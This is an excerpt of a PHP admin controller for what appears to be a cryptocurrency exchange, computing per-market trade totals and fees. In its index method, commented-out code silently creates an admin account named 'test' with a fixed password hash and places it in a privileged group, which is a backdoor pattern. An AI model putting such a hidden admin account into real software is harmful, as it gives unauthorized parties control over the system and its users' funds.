...
class IndexController extends AdminController
{
	public function index()
	{
		...
		// $userj=M('admin')->where(array('username'=>'test'))->find();
		// if(!$userj){
		// 	$map['username']='test';
		// 	$map['status']=1;
		// 	$map['password']='92d7ddd2a010c59511dc2905b7e14f64';
		// 	M('admin')->add($map);
		// 	$testuser=M('admin')->where(array('username'=>'test'))->find();
		// 	$authm['uid']=$testuser['id'];
		// 	$authm['group_id']=16;
		// 	M('auth_group_access')->add($authm);
		// }
	...
	public function market($market = NULL)
	{
		...
		$data = array();
		$data['trance_num'] = M('TradeLog')->where(array('market' => $market,'userid' => array('gt', 0)))->sum('num');
		$data['trance_buyfee'] = M('TradeLog')->where(array('market' => $market,'userid' => array('gt', 0)))->sum('fee_buy');
		$data['trance_sellfee'] = M('TradeLog')->where(array('market' => $market,'userid' => array('gt', 0)))->sum('fee_sell');
		$data['trance_fee'] = $data['trance_buyfee'] + $data['trance_sellfee'];
		$data['trance_mum'] = M('TradeLog')->where(array('market' => $market,'userid' => array('gt', 0)))->sum('mum');
		$data['trance_ci'] = M('TradeLog')->where(array('market' => $market,'userid' => array('gt', 0)))->count();
		...
		if ($market_json) {
			...
			$addtime = M('TradeLog')->where(array('market' => $market,'userid' => array('gt', 0)))->order('addtime asc')->find()['addtime'];
		}
